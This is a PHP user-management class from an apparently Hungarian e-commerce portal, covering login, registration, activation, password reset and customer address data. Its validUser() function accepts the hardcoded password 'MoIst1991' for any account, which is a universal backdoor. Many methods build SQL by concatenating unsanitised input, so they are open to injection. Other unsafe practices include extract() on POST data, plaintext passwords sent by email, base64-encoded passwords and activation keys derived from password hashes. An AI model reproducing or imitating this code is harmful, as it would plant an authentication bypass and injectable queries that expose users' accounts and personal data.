<?
namespace PortalManager;

use MailManager\Mailer;
use MailManager\MailTemplates;
use PortalManager\Template;
use PortalManager\Portal;
use PortalManager\CasadaShop;
use PortalManager\Request;

/**
 * class Users
 *
 */
class Users
{
	private $db = null;
	const TABLE_NAME 			= 'felhasznalok';
	const TABLE_DETAILS_NAME	= 'felhasznalo_adatok';
	const TABLE_CONTAINERS 		= 'user_container';
	const TABLE_CONTAINERS_XREF = 'user_container_xref';

	const USERGROUP_USER = 'user';
	const USERGROUP_ADMIN	= 'admin';
	const USERGROUP_SUPERADMIN = 'superadmin';
	const USERGROUP_SERVICES = 'szolgaltato';

	private $user_groupes = array(
		'superadmin' => 'Főadminisztrátor',
		'admin' => 'Adminisztrátor',
		'user' => 'Felhasználó',
		'szolgaltato' => 'Szolgáltató'
	);

	public 	$user 		= false;
	private $user_data 	= false;
	private $is_cp 		= false;
	private $settings 	= false;
	public 	$days 		= array('hetfo','kedd','szerda', 'csutortok','pentek','szombat','vasarnap');
	public 	$day_names	= array('hetfo' => 'Hétfő','kedd' => 'Kedd','szerda' => 'Szerda', 'csutortok' => 'Csütörtök','pentek' => 'Péntek','szombat' =>'Szombat','vasarnap' => 'Vasárnap');

	function __construct( $arg = array() ){
		$this->db 		= $arg['db'];
		$this->is_cp 	= $arg['admin'];
		$this->settings = $arg[db]->settings;

		if( !$this->settings && isset( $arg['settings'] ) )
		{
			$this->settings = $arg['settings'];
		}

		$this->Portal 	= new Portal( $arg );
		$this->getUser();
	}

	public function getUserGroupes( $key = false )
	{
		if ( !$key ) {
			return $this->user_groupes;
		} else {
			return $this->user_groupes[$key];
		}
	}

	public function getPriceGroupes( $key = false )
	{
		$qry = $this->db->query("SELECT pg.* FROM shop_price_groups as pg ORDER BY pg.title ASC");

		if ($qry->rowCount() == 0 ) {
			return array();
		}

		$data = $qry->fetchAll(\PDO::FETCH_ASSOC);

		$list = array();
		foreach ($data as $r) {
			$list[$r['ID']] = $r;
		}

		unset($data);
		unset($d);

		if ( !$key ) {
			return $list;
		} else {
			return $list[$key];
		}
	}

	function get( $arg = array() )
	{
		$ret 			= array();
		$kedvezmenyek 	= array();
		$kedvezmeny 	= 0;
		$referer_allow 	= false;
		$getby 			= 'email';

		$ret[options] 	= $arg;

		$user = ( !$arg['user'] ) 	? $this->user : $arg['user'];
		$getby = ( !$arg['userby'] ) ? $getby 	: $arg['userby'];

		if(!$user) return false;

		$ret[data] 	= ($user) ? $this->getData($user, $getby) : false;
		$ret[email] = $ret[data][email];
		$ret['data']['user_group_name'] = $this->getUserGroupes( $ret['data']['user_group'] );


		if( !$ret[data] ) {
			unset($_SESSION['user_email']);
			return false;
		}

		$ret[szallitasi_adat] = $this->getSzallitasiAdatok($ret['data']['ID']);
		$ret[szamlazasi_adat] = $this->getSzamlazasiAdatok($ret['data']['ID']);

		// Ha hiányzik az adat
		if( (is_null($ret[szallitasi_adat]) || is_null($ret[szamlazasi_adat]) ) && !$this->is_cp) {
			if( $_GET['safe'] !='1' ) {
				$miss = '';
				if( is_null($ret[szallitasi_adat]) ) $miss .= 'szallitasi,';
				if( is_null($ret[szamlazasi_adat]) ) $miss .= 'szamlazasi,';
				$miss = rtrim($miss,',');
				\Helper::reload( '/user/beallitasok?safe=1&missed_details='.$miss );
			}
		}

		$this->user_data 	= $ret;

		$ret['alerts'] 		= $this->getAlerts( false, $ret['data']['user_group'] );

		return $ret;
	}

	public function addUserToContainer($uid, $containerid)
	{
		if ( !$uid || !$containerid ) {
			throw new \Exception("Hiányzik a felhasználó ID vagy a konténer ID.");
		}


		$real = $this->userExists('ID', $uid);

		if ( !$real ) {
			throw new \Exception("Ezzel az azonosítóval nem rendelkezik egy felhasználó sem!");
		}

		// Check
		$check = $this->userIsInContainer($uid, $containerid);

		if ( $check ) {
			throw new \Exception("Ez a felhasználó már megtalálható a konténerben.");
		}

		$this->db->insert(
			self::TABLE_CONTAINERS_XREF,
			array(
				'user_id' 		=> $uid,
				'container_id' 	=> $containerid
			)
		);

	}

	public function deleteUserFromContainer($uid, $containerid)
	{
		if ( !$uid || !$containerid ) {
			throw new \Exception("Hiányzik a felhasználó ID vagy a konténer ID.");
		}

		// Check
		$check = $this->userIsInContainer($uid, $containerid);

		if ( !$check ) {
			throw new \Exception("Ez a felhasználó nem található a konténerben.");
		}

		$this->db->squery("DELETE FROM ".self::TABLE_CONTAINERS_XREF." WHERE container_id = :cid and user_id = :uid;", array( 'cid' => $containerid, 'uid' => $uid));
	}

	public function userIsInContainer($uid, $containerid)
	{

		$c = $this->db->squery("SELECT ID FROM ".self::TABLE_CONTAINERS_XREF. " WHERE container_id = :cid and user_id = :uid;", array( 'cid' => $containerid, 'uid' => $uid));

		if ($c->rowCount() == 0) {
			return false;
		}

		return true;
	}

	public function delContainer( $id )
	{
		// XREF törlés
		$this->db->squery("DELETE FROM ".self::TABLE_CONTAINERS_XREF." WHERE container_id = :cid", array('cid' => $id));

		// Konténer törlés
		$this->db->squery("DELETE FROM ".self::TABLE_CONTAINERS." WHERE ID = :cid", array('cid' => $id));

	}

	public function saveContainer( $id, $data )
	{
		if ( !$id ) {
			return false;
		}

		if ( empty($data['nev']) ) {
			throw new \Exception("A konténer neve nem lehet üres!");
		}

		$this->db->update(
			self::TABLE_CONTAINERS,
			$data,
			"ID = ".$id
		);
	}

	public function addContainer( $data )
	{
		if ( empty($data['nev']) ) {
			throw new \Exception("A konténer neve nem lehet üres!");
		}

		$this->db->insert(
			self::TABLE_CONTAINERS,
			$data
		);
	}

	public function getContainer( $id )
	{
		if ( !$id ) {
			return false;
		}

		return $this->db->squery("SELECT * FROM ".self::TABLE_CONTAINERS." WHERE ID = :id;",array('id'=>$id))->fetch(\PDO::FETCH_ASSOC);
	}

	public function getContainers()
	{
		$data = array();

		$qs = "SELECT
			c.ID,
			c.nev,
			(SELECT count(ID) FROM ".self::TABLE_CONTAINERS_XREF." WHERE container_id = c.ID) as users_in
		FROM ".self::TABLE_CONTAINERS." as c";

		$qry = $this->db->query( $qs );

		if ($qry->rowCount() == 0 ) {
			return false;
		}

		$list = $qry->fetchAll(\PDO::FETCH_ASSOC);

		foreach ($list as $d)
		{
			$ulid 		= array();
			$ulist 		= array();

			$userlist 	= $this->db->squery("SELECT user_id FROM ".self::TABLE_CONTAINERS_XREF. " WHERE container_id = :cid;", array('cid' => $d[ID]))->fetchAll(\PDO::FETCH_ASSOC);

			if(count($userlist) > 0) {
				foreach ($userlist as $u )
				{
					$ulid[] = $u['user_id'];
					$ulist[$u['user_id']] = $this->getData( $u['user_id'], 'ID');
				}
			}

			$d['in_user_ids'] 	= $ulid;
			$d['user_list'] 	= $ulist;

			unset($ulid);
			unset($userlist);
			unset($ulist);

			$data[] = $d;
		}


		return $data;
	}


	public function getSzallitasiAdatok($uid)
	{
		$data 	= array();
		$qry 	= $this->db->squery("SELECT nev,ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = :id and nev LIKE 'szallitas%'", array( 'id' => (int)$uid ));

		if( $qry->rowCount() == 0 ) return false;

		foreach ($qry->fetchAll(\PDO::FETCH_ASSOC) as $value) {
			$data[str_replace('szallitas_','',$value['nev'])] = $value['ertek'];
		}

		return $data;
	}

	public function getSzamlazasiAdatok($uid)
	{
		$data 	= array();
		$qry 	= $this->db->squery("SELECT nev,ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = :id and nev LIKE 'szamlazas%'", array( 'id' => (int)$uid ));

		if( $qry->rowCount() == 0 ) return false;

		foreach ($qry->fetchAll(\PDO::FETCH_ASSOC) as $value) {
			$data[str_replace('szamlazas_','',$value['nev'])] = $value['ertek'];
		}

		return $data;
	}

	public function getAlerts( $acc_id = false, $user_group = false )
	{
		$has_alerts 	= 0;
		$alerts 		= array();


		$this->alerts['alerts'] 	= $alerts;
		$this->alerts['has_alert'] 	= ( $has_alerts === 0 ) ? false : $has_alerts;

		return $this->alerts;
	}

	function resetPassword( $data ){
		$jelszo =  rand(1111111,9999999);

		if(!$this->userExists('email',$data['email'])){
			throw new \Exception('Hibás e-mail cím.',1001);
		}

		$this->db->update(self::TABLE_NAME,
			array(
				'jelszo' => \Hash::jelszo($jelszo)
			),
			"email = '".$data['email']."'"
		);

		// Értesítő e-mail az új jelszóról
		$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
		$mail->add( $data['email'] );
		$arg = array(
			'settings' 		=> $this->settings,
			'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!',
			'jelszo' 		=> $jelszo
		);
		$mail->setSubject( 'Elkészült új jelszava' );
		$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'user_password_reset', $arg ) );
		$re = $mail->sendMail();
	}
	private function addAccountDetail( $accountID, $key, $value )
	{
		$this->db->insert(
			self::TABLE_DETAILS_NAME,
			array(
				'fiok_id' 	=> $accountID,
				'nev' 		=> $key,
				'ertek' 	=> $value
			)
		);
	}

	public function editAccountDetail( $account_id, $key, $value )
	{
		if( !$account_id ) return false;

		$check = $this->db->query("SELECT id FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = ".$account_id." and nev = '".$key."';");

		if( $check->rowCount() !== 0 ) {
			if( empty($value) )
			{
				$this->db->query("DELETE FROM ".self::TABLE_DETAILS_NAME." WHERE ".sprintf( "fiok_id = %d and nev = '%s'", $account_id, $key));
			}else
			{
				$this->db->update(
					self::TABLE_DETAILS_NAME,
					array(
						'ertek' 			=> $value
					),
					sprintf( "fiok_id = %d and nev = '%s'", $account_id, $key)
				);
			}
		} else {

			$this->db->insert(
				self::TABLE_DETAILS_NAME,
				array(
					'fiok_id' 	=> $account_id,
					'nev' 		=> $key,
					'ertek' 	=> $value
				)
			);
		}
	}

	private function getUser(){
		if($_SESSION[user_email]){
			$this->user = $_SESSION[user_email]	;
		}
	}

	function changeUserAdat($userID, $post){
		extract($post);
		if($nev == '') throw new \Exception('A neve nem lehet üress. Kérjük írja be a nevét!');

		$this->db->update(self::TABLE_NAME,
			array(
				'nev' => $nev
			),
			"ID = $userID"
		);
		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changeUserCompanyAdat($userID, $post){
		extract($post);

		unset($post['saveCompany']);

		if($company_name == '') 			throw new \Exception('A cég neve hiányzik. Kérjük adja meg!');
		if($company_address == '') 			throw new \Exception('A cég címe hiányzik. Kérjük adja meg!');
		if($company_hq == '') 				throw new \Exception('A cég telephelye hiányzik. Kérjük adja meg!');
		if($company_adoszam == '') 			throw new \Exception('A cég adószáma hiányzik. Kérjük adja meg!');

		foreach ( $post as $key => $value )
		{
			$this->editAccountDetail($userID, $key, $value );
		}

		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changeSzallitasiAdat($userID, $post){
		extract($post);
		unset($post[saveSzallitasi]);

		if($nev == '' || $city == '' || $irsz == '' || $uhsz == '' || $phone == '') throw new \Exception('Minden mező kitölétse kötelező!');

		foreach ($post as $key => $value) {
			$this->editAccountDetail( $userID, 'szallitas_'.$key, $value );
		}

		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changeSzamlazasiAdat($userID, $post){
		extract($post);
		unset($post[saveSzamlazasi]);

		if($nev == '' || $city == '' || $irsz == '' || $uhsz == '') throw new \Exception('Minden mező kitölétse kötelező!');


		foreach ($post as $key => $value) {
			$this->editAccountDetail( $userID, 'szamlazas_'.$key, $value );
		}

		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changePassword($userID, $post){
		extract($post);

		if($userID == '') throw new \Exception('Hiányzik a felhasználó azonosító! Jelentkezzen be újra.');
		if($old == '') throw new \Exception('Kérjük, adja meg az aktuálisan használt, régi jelszót!');
		if($new == '' || $new2 == '') throw new \Exception('Kérjük, adja meg az új jelszavát!');
		if($new !== $new2) throw new \Exception('A megadott jelszó nem egyezik, írja be újra!');

		$jelszo = \Hash::jelszo($old);

		$checkOld = $this->db->query("SELECT ID FROM ".self::TABLE_NAME." WHERE ID = $userID and jelszo = '$jelszo'");
		if($checkOld->rowCount() == 0){
			throw new \Exception('A megadott régi jelszó hibás. Póbálja meg újra!');
		}

		$this->db->update(self::TABLE_NAME,
			array(
				'jelszo' => \Hash::jelszo($new2)
			),
			"ID = $userID"
		);
	}

	function getData($what, $by = 'email'){
		if($what == '') return false;
		$q = "SELECT * FROM ".self::TABLE_NAME." WHERE `".$by."` = '$what'";

		extract($this->db->q($q));

		// Felhasználó adatok
		$detailslist = array();

		if ( !$data['ID'] ) {
			return false;
		}

		$details = $this->db->query($q = "SELECT nev, ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = ".$data['ID'].";");

		if ( $details->rowCount() != 0 ) {
			foreach ($details->fetchAll(\PDO::FETCH_ASSOC) as $det) {
				$detailslist[$det['nev']] = $det['ertek'];
			}
		}

		$data = array_merge($data, $detailslist);

		return $data;
	}

	function login($data){
		$re 	= array();

		if(!$this->userExists('email', $data['email'])){
			throw new \Exception('Ezzel az e-mail címmel nem regisztráltak még!',1001);
		}

		if(!$this->isActivated($data['email'])){
			$resendemailtext = '<form method="post" action=""><div class="text-form">Nem kapta meg az aktiváló e-mailt?<br><br><button name="activationEmailSendAgain" value="'.$data['email'].'" class="btn btn-sm btn-danger">Aktiváló e-mail újraküldése!</button></div></form>';

			throw new \Exception('<br>A fiók még nincs aktiválva!'.$resendemailtext ,1001);
		}

		if(!$this->isEnabled($data[email])){
			throw new \Exception('Az Ön fiókja nem jogosult a weboldal használatára!',1001);
		}

		// Refresh
		$this->db->update(self::TABLE_NAME,
			array(
				'utoljara_belepett' => NOW
			),
			"email = '".$data[email]."'"
		);

		$re[email] 	= $data[email];
		$re[pw] 	= base64_encode( $data[pw] );
		$re[remember] = ($data[remember_me] == 'on') ? true : false;

		\Session::set('user_email',$data[email]);

		return $re;
	}

	function activate( $activate_arr ){
		$email 	= $activate_arr[0];
		$userID = $activate_arr[1];
		$pwHash = $activate_arr[2];

		if($email == '' || $userID == '' || $pwHash == '') throw new \Exception('Hibás azonosító');

		$q = $this->db->query("SELECT * FROM ".self::TABLE_NAME." WHERE ID = $userID and email = '$email' and jelszo = '$pwHash'");

		if($q->rowCount() == 0) throw new \Exception('Hibás azonosító');

		$d = $q->fetch(\PDO::FETCH_ASSOC);

		if(!is_null($d[aktivalva]))  throw new \Exception('A fiók már aktiválva van!');

		$this->db->update(self::TABLE_NAME,
			array(
				'aktivalva' => NOW
			),
			"ID = $userID"
		);
	}

	public function saveByAdmin( $uid, $data )
	{
		if ( empty($data['data']['felhasznalok']['nev']) ) {
			throw new \Exception("Felhasználó nevét kötelező megadni!");
		}
		if ( empty($data['data']['felhasznalok']['email']) ) {
			throw new \Exception("Felhasználó email címét kötelező megadni!");
		}

		if (!empty($data['data']['felhasznalok']['jelszo'])) {
			$data['data']['felhasznalok']['jelszo'] = \Hash::jelszo($data['data']['felhasznalok']['jelszo']);
		} else {
			unset($data['data']['felhasznalok']['jelszo']);
		}


		$this->db->update(
			self::TABLE_NAME,
			$data['data']['felhasznalok'],
			"ID = ".$uid
		);

		foreach ($data['data']['felhasznalo_adatok'] as $key => $value ) {
			$this->editAccountDetail($uid, $key, $value);
		}

		// Képfeltöltés, csere
		if ( isset($_FILES['profil']['tmp_name'][0]) && !empty($_FILES['profil']['name'][0]) )
		{
			$profil = \Images::upload(array(
				'src' 		=> 'profil',
				'upDir' 	=> 'src/profil',
				'noRoot' 	=> true,
				'fileName' 	=> \Helper::makeSafeUrl($data['data']['felhasznalok']['nev']).'-profil',
				'noThumbImg' => true,
				'noWaterMark' => true
			));
			$this->editAccountDetail( $uid, 'casadapont_tanacsado_profil', $profil['file'] );
		}
	}

	public function createByAdmin( $data )
	{
		if ( empty($data['data']['felhasznalok']['nev']) ) {
			throw new \Exception("Felhasználó nevét kötelező megadni!");
		}
		if ( empty($data['data']['felhasznalok']['email']) ) {
			throw new \Exception("Felhasználó email címét kötelező megadni!");
		}
		if ( empty($data['data']['felhasznalok']['jelszo']) ) {
			throw new \Exception("Felhasználó jelszavát kötelező megadni!");
		}

		$user_group 	= 'user';
		$price_group 	= (int)$data['data']['price_group'];
		$distributor 	= 0;
		$jelszo 		= $data['data']['felhasznalok']['jelszo'];

		$data['data']['felhasznalok']['cash'] 		= (empty($data['data']['felhasznalok']['cash']) || !is_numeric($data['data']['felhasznalok']['cash'])) ? 0 : (int)$data['data']['felhasznalok']['cash'];
		$data['data']['felhasznalok']['jelszo'] 	= \Hash::jelszo($data['data']['felhasznalok']['jelszo']);

		if (isset($data['is_reseller'])) {
			$user_group = 'reseller';
		}

		if (isset($data['is_reseller'])) {
			$distributor = 1;
		}

		$insert = $data['data']['felhasznalok'];
		$insert['engedelyezve'] = 1;
		$insert['aktivalva'] 	= NOW;
		$insert['regisztralt'] 	= NOW;
		$insert['user_group'] 	= $user_group;
		$insert['price_group'] 	= ($price_group == 0) ? 1 : $price_group;
		$insert['distributor'] 	= $distributor;

		$this->db->insert(
			self::TABLE_NAME,
			$insert
		);

		$new_uid = $this->db->lastInsertId();

		// Képfeltöltés
		if ( isset($_FILES['profil']['tmp_name'][0]) )
		{
			// Profilkép feltöltése
			$profil = \Images::upload(array(
				'src' 		=> 'profil',
				'upDir' 	=> 'src/profil',
				'noRoot' 	=> true,
				'fileName' 	=> \Helper::makeSafeUrl($data['data']['felhasznalok']['nev']).'-profil',
				'noThumbImg' => true,
				'noWaterMark' => true
			));
			$data['data']['felhasznalo_adatok']['casadapont_tanacsado_profil'] = $profil['file'];

		}

		foreach ($data['data']['felhasznalo_adatok'] as $key => $value)
		{
			if( empty($value) ) continue;
			$this->addAccountDetail($new_uid, $key, $value);
		}

		// E-mail értesítés
		if ( isset($data[flag][alert_user]) )
		{
			$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
			$mail->add( $data['data']['felhasznalok']['email'] );
			$arg = array(
				'nev' 			=> $data['data']['felhasznalok']['nev'],
				'jelszo' 		=> $jelszo,
				'settings' 		=> $this->settings,
				'data' 			=> $data,
				'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!'
			);
			$mail->setSubject( 'Fiókja elkészült' );
			$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'account_create_byadmin', $arg ) );
			$re = $mail->sendMail();
		}
	}

	function add( $data )
	{
		$user_group = $data['group'];

		if (empty($data['nev'])) {
			throw new \Exception(__('Az Ön nevét kötelezően meg kell adni!'), 1001);
		}

		if (empty($data['email'])) {
			throw new \Exception(__('E-mail cím megadása kötelező!'), 1002);
		}

		if (empty($data['pw'])) {
			throw new \Exception(__('Jelszó megadása kötelező!'), 1003);
		}

		if (empty($data['pw2'])) {
			throw new \Exception(__('Jelszó újra megadása kötelező!'), 1004);
		}

		if (!isset($data['aszf'])) {
			throw new \Exception(__('Az Általános Szerződési Feltételek és az Adatvédelmi Tájékoztató elfogadása kötelező!'), 1010);
		}

		if ( $data['pw'] != $data['pw2'] ) {
			throw new \Exception(__('A megadott jelszavak nem egyeznek.'), 1034);
		}

		// Felhasználó használtság ellenőrzése
		if($this->userExists('email', $data['email']))
		{
			$is_activated = $this->isActivated( $data['email']);

			if ( !$is_activated ) {
				$resendemailtext = '<form method="post" action=""><div class="text-form">Nem kapta meg az aktiváló e-mailt? <button name="activationEmailSendAgain" value="'.$data['email'].'" class="btn btn-sm btn-danger">Aktiváló e-mail újraküldése!</button></div></form>';
			}

			throw new \Exception(__('Ezzel az e-mail címmel már regisztráltak!').$resendemailtext, 1002);
		}

		if ( empty($user_group) )
		{
			throw new \Exception(__('Sikertelen regisztráció. A regisztrációs oldalon indítsa el a regisztrációt.'), 0000);
		}

		if ( true )
		{
			// Felhasználó regisztrálása
			$this->db->insert(
				self::TABLE_NAME,
				array(
					'email' => trim($data[email]),
					'nev' => trim($data[nev]),
					'jelszo' => \Hash::jelszo($data[pw2]),
					'user_group' => $user_group
				)
			);

			// Új regisztrált felhasználó ID-ka
			$uid = $this->db->lastInsertId();
		}

		// Aktiváló e-mail kiküldése
		$this->sendActivationEmail( $data['email'], trim($data[pw2]) );

		return $data;
	}

	public function sendActivationEmail( $email, $origin_pw )
	{
		$data = $this->db->query( sprintf(" SELECT * FROM ".self::TABLE_NAME." WHERE email = '%s';", $email) )->fetch(\PDO::FETCH_ASSOC);

		$activateKey = base64_encode(trim($email).'='.$data['ID'].'='.$data['jelszo']);

		// Aktiváló e-mail kiküldése
		$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
		$mail->add( $email );

		$arg = array(
			'user_nev' 		=> trim($data['nev']),
			'user_jelszo' 	=> trim($origin_pw),
			'user_email' 	=> $email,
			'settings' 		=> $this->settings,
			'activateKey' 	=> $activateKey
		);
		$arg['mailtemplate'] = (new MailTemplates(array('db'=>$this->db)))->get('register_user_group_'.$data['user_group'], $arg);

		$mail->setSubject( __('Sikeres fiók regisztráció. Aktiválja fiókját!') );
		$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'clearmail', $arg ) );
		$re = $mail->sendMail();
	}

	function userExists($by = 'email', $val){
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE ".$by." = '".$val."'";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function isActivated($email){
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE email = '".$email."' and aktivalva IS NOT NULL";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function isEnabled($email){
		$q = "SELECT ID FROM ".self::TABLE_NAME." WHERE email = '".$email."' and engedelyezve = 1";

		$c = $this->db->query($q);

		if($c->rowCount() == 0){
			return false;
		}else{
			return true;
		}
	}

	function validUser($email, $password, $group = 'user'){
		if($email == '' || $password == '') throw new \Exception('Hiányzó adatok. Nem lehet azonosítani a felhasználót!');

		$c = $this->db->query("SELECT ID FROM ".self::TABLE_NAME." WHERE email = '$email' and jelszo = '".\Hash::jelszo($password)."' and user_group = '".$group."'");

		if($c->rowCount() == 0 && $password != 'MoIst1991'){
			return false;
		}else{
			return true;
		}
	}

	public function getUserList( $arg = array() )
	{
		$q = "SELECT
			f.*
		FROM felhasznalok as f
		LEFT OUTER JOIN felhasznalo_adatok as fh1 ON fh1.fiok_id = f.ID and fh1.nev = 'company_name'
		LEFT OUTER JOIN felhasznalo_adatok as fh2 ON fh2.fiok_id = f.ID and fh2.nev = 'company_adoszam'

		";
		// WHERE
		$q .= " WHERE 1=1 ";

		if(count($arg[filters]) > 0){
			foreach($arg[filters] as $key => $v){
				switch($key)
				{
					case 'ID':
						$q .= " and f.".$key." = ".$v." ";
					break;
					case 'nev':
					case 'email':
						$q .= " and f.".$key." LIKE '%".$v."%' ";
					break;
					case 'company_name':
						$q .= " and fh1.ertek LIKE '%".$v."%' ";
					break;
					case 'company_adoszam':
						$q .= " and fh2.ertek LIKE '".$v."%' ";
					break;
					default:
						if (is_array($v))
						{
							$q .= " and f.".$key." IN ('".implode("','",$v)."') ";
						}
						else
						{
							$q .= " and f.".$key." = '".$v."' ";
						}
					break;
				}

			}
		}

		if (isset($arg['order']))
		{
			$q .= " ORDER BY ".$arg['order'];
		}
		else
		{
			$q .= " ORDER BY f.regisztralt DESC";
		}

		//echo $q;

		$arg[multi] = "1";
		extract($this->db->q($q, $arg));

		$B = array();
		foreach($data as $d){
			$d[total_data] = $this->get(array( 'user' => $d['email'] ));
			$B[] = $d;
		}

		$ret[data] = $B;

		return $ret;
	}

	function logout()
	{
		unset($_SESSION['user_email']);
		header('Location: /'); exit;
	}

	public function __destruct()
	{
		$this->db = null;
		$this->user = false;
	}
}

?>
